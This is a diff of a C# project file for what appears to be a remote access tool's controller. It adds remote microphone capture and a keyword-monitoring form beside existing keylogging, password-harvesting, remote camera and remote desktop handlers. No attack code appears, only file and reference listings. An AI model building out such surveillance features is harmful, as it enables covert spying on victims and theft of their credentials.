@@ -73,6 +73,9 @@
     <Reference Include="MRG.Controls.UI">
       <HintPath>..\DLLs + Package\MRG.Controls.UI.dll</HintPath>
     </Reference>
+    <Reference Include="NAudio">
+      <HintPath>..\DLLs + Package\NAudio.dll</HintPath>
+    </Reference>
     <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
       <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
     </Reference>
@@ -104,6 +107,12 @@
     </Compile>
     <Compile Include="Forms\AboutForm.Designer.cs">
       <DependentUpon>AboutForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\KeywordsForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\KeywordsForm.Designer.cs">
+      <DependentUpon>KeywordsForm.cs</DependentUpon>
     </Compile>
     <Compile Include="Forms\DownloadFileForm.cs">
       <SubType>Form</SubType>
@@ -183,11 +192,17 @@
     <Compile Include="Forms\ProcessManagerForm.Designer.cs">
       <DependentUpon>ProcessManagerForm.cs</DependentUpon>
     </Compile>
-    <Compile Include="Forms\RemoteCamera.cs">
+    <Compile Include="Forms\RemoteAudioForm.cs">
       <SubType>Form</SubType>
     </Compile>
-    <Compile Include="Forms\RemoteCamera.Designer.cs">
-      <DependentUpon>RemoteCamera.cs</DependentUpon>
+    <Compile Include="Forms\RemoteAudioForm.Designer.cs">
+      <DependentUpon>RemoteAudioForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\RemoteCameraForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\RemoteCameraForm.Designer.cs">
+      <DependentUpon>RemoteCameraForm.cs</DependentUpon>
     </Compile>
     <Compile Include="Forms\RemoteDesktopForm.cs">
       <SubType>Form</SubType>
@@ -209,9 +224,12 @@
     <Compile Include="PacketParser\InformationPacketHandler.cs" />
     <Compile Include="PacketParser\KeylogOfflinePacketHandler.cs" />
     <Compile Include="PacketParser\KeylogPacketHandler.cs" />
+    <Compile Include="PacketParser\KeywordsPacketHandler.cs" />
     <Compile Include="PacketParser\PasswordsPacketHandler.cs" />
     <Compile Include="PacketParser\ProcessKillerPacketHandler.cs" />
     <Compile Include="PacketParser\ProcessManagerPacketHandler.cs" />
+    <Compile Include="PacketParser\RemoteAudioCapturePacketHandler.cs" />
+    <Compile Include="PacketParser\RemoteAudioPacketHandler.cs" />
     <Compile Include="PacketParser\RemoteCameraCapturePacketHandler.cs" />
     <Compile Include="PacketParser\RemoteCameraPacketHandler.cs" />
     <Compile Include="PacketParser\RemoteViewerPacketHandler.cs" />
@@ -222,6 +240,7 @@
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Networking\Server.cs" />
+    <Compile Include="Utils\AudioHelpers.cs" />
     <Compile Include="Utils\Miscellaneous.cs" />
     <EmbeddedResource Include="Controls\BlurForm.resx">
       <DependentUpon>BlurForm.cs</DependentUpon>
@@ -231,6 +250,9 @@
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\AboutForm.resx">
       <DependentUpon>AboutForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\KeywordsForm.resx">
+      <DependentUpon>KeywordsForm.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\DownloadFileForm.resx">
       <DependentUpon>DownloadFileForm.cs</DependentUpon>
@@ -271,8 +293,11 @@
     <EmbeddedResource Include="Forms\ProcessManagerForm.resx">
       <DependentUpon>ProcessManagerForm.cs</DependentUpon>
     </EmbeddedResource>
-    <EmbeddedResource Include="Forms\RemoteCamera.resx">
-      <DependentUpon>RemoteCamera.cs</DependentUpon>
+    <EmbeddedResource Include="Forms\RemoteAudioForm.resx">
+      <DependentUpon>RemoteAudioForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\RemoteCameraForm.resx">
+      <DependentUpon>RemoteCameraForm.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\RemoteDesktopForm.resx">
       <DependentUpon>RemoteDesktopForm.cs</DependentUpon>
@@ -392,6 +417,8 @@
   </ItemGroup>
   <ItemGroup>
     <Content Include="eagle2.ico" />
+    <None Include="Resources\control-text-box_large%402x.png" />
+    <None Include="Resources\microphone_large%402x.png" />
     <None Include="Resources\fill-auto%402x.png" />
     <None Include="Resources\button-remove%402x.png" />
     <None Include="Resources\button-add%402x.png" />
